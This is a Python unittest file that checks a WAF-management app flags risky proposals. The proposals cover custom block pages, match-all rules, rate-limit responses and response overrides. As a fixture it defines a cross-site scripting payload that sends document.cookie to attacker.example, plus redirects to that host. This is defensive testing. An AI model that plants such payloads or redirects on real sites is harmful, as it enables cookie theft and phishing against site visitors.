"""What Karna answers to clients is part of the review (2026-10-23 review,
finding 1): a block page, a rule's fixed_response, a response override, a
rule matching every request. Each used to come back with no risks, so one
click could put attacker HTML on the protected site."""
from __future__ import annotations

import unittest

import app
from test_kong_write_review import KARNA_ID, review, rule

XSS_PAGE = "<html><script>fetch('https://attacker.example/?'+document.cookie)</script></html>"


def rule_review(r):
    return app._proposal_review({"type": "add_rule", "plugin_id": "p", "kind": "native", "rule": r})


def override_review(entry):
    return app._proposal_review({"type": "add_override", "plugin_id": "p", "kind": "response", "entry": entry})


class BlockPageTests(unittest.TestCase):
    def test_block_page_through_update_config_is_risky_and_shown(self):
        out = app._proposal_review({"type": "update_config", "plugin_id": "p",
                                    "changes": {"default_block_response_body": XSS_PAGE,
                                                "default_block_response_headers": {"Content-Type": "text/html"}}})
        self.assertEqual(len(out["risks"]), 2)
        self.assertIn(XSS_PAGE, [c["text"] for c in out["content"]])

    def test_block_page_through_kong_request_needs_confirmation(self):
        out = review("PATCH", f"/plugins/{KARNA_ID}",
                     {"config": {"default_block_response_body": XSS_PAGE,
                                 "default_block_response_headers": {"Content-Type": "text/html"}}})
        self.assertTrue(out["risks"])
        self.assertEqual(out["confirm_text"], "demo")
        self.assertIn(XSS_PAGE, [c["text"] for c in out["content"]])

    def test_50x_and_ratelimit_pages_are_risky(self):
        for field in ("default_50x_response_body", "default_ratelimit_response_body"):
            out = app._proposal_review({"type": "update_config", "plugin_id": "p", "changes": {field: "x"}})
            self.assertTrue(out["risks"], field)


class RuleTests(unittest.TestCase):
    def test_plain_block_rule_is_one_click(self):
        out = rule_review({"id": "r", "conditions": [{"variables": ["request.path"], "op": "beginsWith",
                                                      "value": "/admin"}],
                           "action": {"fixed_response": {"status_code": 403}}})
        self.assertEqual(out["risks"], [])
        self.assertNotIn("content", out)

    def test_site_replacement_rule_is_risky(self):
        out = rule_review({"id": "r", "conditions": [{"variables": ["request.method"], "op": "unconditionalMatch"}],
                           "action": {"fixed_response": {"status_code": 200, "body": XSS_PAGE,
                                                         "headers": {"Content-Type": "text/html"}}}})
        text = " ".join(out["risks"])
        self.assertIn("status 200", text)
        self.assertIn("its own body", text)
        self.assertIn("Content-Type", text)
        self.assertIn("Matches every request", text)
        self.assertIn(XSS_PAGE, out["content"][0]["text"])

    def test_match_all_block_is_risky_but_match_all_log_is_not(self):
        cond = [{"variables": ["request.uri"], "op": "rx", "value": ".*"}]
        self.assertTrue(rule_review({"id": "r", "conditions": cond,
                                     "action": {"fixed_response": {"status_code": 503}}})["risks"])
        self.assertEqual(rule_review({"id": "r", "conditions": cond, "action": {"log_only": True}})["risks"], [])
        negated = [{"variables": ["request.method"], "op": "unconditionalMatch", "negated": True}]
        self.assertEqual(rule_review({"id": "r", "conditions": negated,
                                      "action": {"fixed_response": {"status_code": 403}}})["risks"], [])

    def test_side_effects_are_named(self):
        cond = [{"variables": ["request.path"], "op": "eq", "value": "/x"}]
        cases = {
            "fix_matched_parts": {"fix_matched_parts": {"remove_chars_pattern": "[<>]"}},
            "kong.ctx.shared.trusted": {"set_variable": {"type": "shared", "name": "trusted", "value": "1"}},
            "lift bans": {"redis_del": {"key": "karna:banned"}},
            "setvar": {"setvar": {"name": "x", "value": "1"}},
            "MCP stream": {"mcp_event_action": {"type": "inject", "data": "hi"}},
            "does not review": {"something_new": {}},
        }
        for needle, action in cases.items():
            out = rule_review({"id": "r", "conditions": cond, "action": action})
            self.assertIn(needle, " ".join(out["risks"]), needle)
        self.assertEqual(rule_review({"id": "r", "conditions": cond,
                                      "action": {"set_variable": {"type": "plugin", "name": "a", "value": "1"}}})
                         ["risks"], [])

    def test_rate_limit_response_is_reviewed(self):
        out = rule_review({"id": "r", "conditions": [{"variables": ["request.path"], "op": "eq", "value": "/login"}],
                           "action": {"rate_limit": {"limit": 5, "window_seconds": 60,
                                                     "response": {"status_code": 302,
                                                                  "headers": {"Location": "https://attacker.example"}}}}})
        self.assertEqual(len(out["risks"]), 2)
        plain = rule_review({"id": "r", "conditions": [{"variables": ["request.path"], "op": "eq", "value": "/login"}],
                             "action": {"rate_limit": {"limit": 5, "window_seconds": 60}}})
        self.assertEqual(plain["risks"], [])

    def test_rule_through_kong_request_names_the_response(self):
        entry = {"id": "r", "conditions": [{"variables": ["request.method"], "op": "unconditionalMatch"}],
                 "action": {"fixed_response": {"status_code": 200, "body": XSS_PAGE}}}
        out = review("PATCH", f"/plugins/{KARNA_ID}", {"config": {"rules_request": [rule(entry)]}})
        self.assertIn("Matches every request", " ".join(out["risks"]))

    def test_seclang_match_all_deny_and_success_status(self):
        sec = 'SecRule REQUEST_URI "@unconditionalMatch" "id:1,phase:1,deny,status:200"'
        out = review("PATCH", f"/plugins/{KARNA_ID}", {"config": {"custom_secrules": [sec]}})
        text = " ".join(out["risks"])
        self.assertIn("status 200", text)
        self.assertIn("every request", text)


class ResponseOverrideTests(unittest.TestCase):
    def test_redirect_override_is_risky(self):
        out = override_review({"selector": {"tags": ["attack-xss"]},
                               "response": {"status_code": 302, "headers": {"Location": "https://attacker.example"}}})
        self.assertEqual(len(out["risks"]), 2)
        self.assertIn("Location", out["content"][0]["text"])

    def test_status_only_error_override_is_one_click(self):
        out = override_review({"selector": {"ids": ["942100"]}, "response": {"status_code": 406}})
        self.assertEqual(out["risks"], [])


if __name__ == "__main__":
    unittest.main()
